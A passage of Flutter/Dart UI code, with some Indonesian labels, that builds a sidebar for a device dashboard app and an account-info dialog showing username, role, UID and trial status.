                          style: TextStyle(color: const Color(0xFF00d4ff)),
                        ),
                      ],
                    ),
                  ),
                ),
                IconButton(
                  onPressed: _toggleSidebar,
                  icon: Icon(Icons.close, color: Colors.white.withOpacity(0.3), size: 16),
                  padding: EdgeInsets.zero,
                  constraints: const BoxConstraints(),
                ),
              ],
            ),
          ),

          // Nav Items
          Expanded(
            child: ListView(
              padding: const EdgeInsets.all(8),
              children: [
                _buildSidebarItem(
                  icon: Icons.dashboard_outlined,
                  title: 'Dashboard',
                  isActive: _currentPage == 0,
                  onTap: () {
                    setState(() => _currentPage = 0);
                    _toggleSidebar();
                  },
                ),
                _buildSidebarItem(
                  icon: Icons.phone_android_outlined,
                  title: 'Devices',
                  isActive: _currentPage == 1,
                  onTap: () {
                    setState(() => _currentPage = 1);
                    _toggleSidebar();
                  },
                  badge: _devices.length.toString(),
                ),
                _buildSidebarItem(
                  icon: Icons.tune_outlined,
                  title: 'Kontrol',
                  isActive: _currentPage == 2,
                  onTap: () {
                    setState(() => _currentPage = 2);
                    _toggleSidebar();
                  },
                ),
                const Divider(
                  color: Color(0xFF4f8dff),
                  thickness: 0.5,
                  indent: 10,
                  endIndent: 10,
                ),
                _buildSidebarItem(
                  icon: Icons.admin_panel_settings_outlined,
                  title: 'Admin Panel',
                  onTap: () {
                    _toggleSidebar();
                    // Navigate to admin panel
                  },
                  isActive: false,
                ),
                _buildSidebarItem(
                  icon: Icons.info_outline,
                  title: 'Info Akun',
                  onTap: () {
                    _toggleSidebar();
                    _showMyInfoDialog();
                  },
                  isActive: false,
                ),
                const Divider(
                  color: Color(0xFF4f8dff),
                  thickness: 0.5,
                  indent: 10,
                  endIndent: 10,
                ),
                _buildSidebarItem(
                  icon: Icons.devices_outlined,
                  title: 'Devices Online',
                  onTap: null,
                  isActive: false,
                  badge: _devices.length.toString(),
                ),
              ],
            ),
          ),

          // Footer
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              border: Border(
                top: BorderSide(
                  color: const Color(0xFF4f8dff).withOpacity(0.08),
                ),
              ),
            ),
            child: Row(
              children: [
                Container(
                  width: 34,
                  height: 34,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.2)),
                    color: const Color(0xFF4f8dff).withOpacity(0.06),
                  ),
                  child: Center(
                    child: Text(
                      widget.displayName[0].toUpperCase(),
                      style: const TextStyle(
                        fontSize: 14,
                        fontWeight: FontWeight.w700,
                        color: Color(0xFF4d8fff),
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        widget.displayName,
                        style: const TextStyle(
                          fontSize: 12,
                          fontWeight: FontWeight.w600,
                          color: Colors.white,
                        ),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                      Text(
                        _role.toUpperCase(),
                        style: TextStyle(
                          fontSize: 7,
                          color: const Color(0xFF4a6a9a),
                          fontFamily: 'IBM Plex Mono',
                          letterSpacing: 1.5,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSidebarItem({
    required IconData icon,
    required String title,
    required bool isActive,
    required VoidCallback? onTap,
    String? badge,
  }) {
    return ListTile(
      leading: Icon(
        icon,
        color: isActive ? const Color(0xFF4d8fff) : const Color(0xFF4a6a9a),
        size: 18,
      ),
      title: Text(
        title,
        style: TextStyle(
          fontSize: 13,
          fontWeight: isActive ? FontWeight.w600 : FontWeight.w400,
          color: isActive ? const Color(0xFF4d8fff) : const Color(0xFF8ab4e0),
        ),
      ),
      trailing: badge != null
          ? Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                color: const Color(0xFF4f8dff).withOpacity(0.08),
              ),
              child: Text(
                badge,
                style: const TextStyle(
                  fontSize: 10,
                  color: Color(0xFF4d8fff),
                  fontFamily: 'IBM Plex Mono',
                ),
              ),
            )
          : null,
      onTap: onTap,
      contentPadding: const EdgeInsets.symmetric(horizontal: 12),
      tileColor: isActive
          ? const Color(0xFF4f8dff).withOpacity(0.06)
          : Colors.transparent,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(10),
        side: isActive
            ? BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.1))
            : BorderSide.none,
      ),
    );
  }

  void _showMyInfoDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: const Text('Info Akun', style: TextStyle(color: Colors.white)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildInfoRow('Username', widget.username),
            _buildInfoRow('Display Name', widget.displayName),
            _buildInfoRow('Role', _role.toUpperCase()),
            _buildInfoRow('UID', _uid),
            _buildInfoRow('Trial', _trialExpiry != null ? _getTrialRemaining() : 'Permanent'),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              Clipboard.setData(ClipboardData(text: _uid));
              _showToast('Disalin', 'UID disalin', isError: false);
            },
            child: const Text('COPY UID', style: TextStyle(color: Color(0xFF4d8fff))),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup', style: TextStyle(color: Color(0xFF3d6080))),
          ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          SizedBox(
            width: 80,
            child: Text(
              label,
              style: const TextStyle(
                fontSize: 10,
                color: Color(0xFF3d6080),
                fontFamily: 'IBM Plex Mono',
                letterSpacing: 1,
              ),
            ),
          ),
          Expanded(
            child: Text(
              value,
              style: const TextStyle(
                fontSize: 12,
                color: Colors.white,
              ),
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ],
      ),
    );
  }
}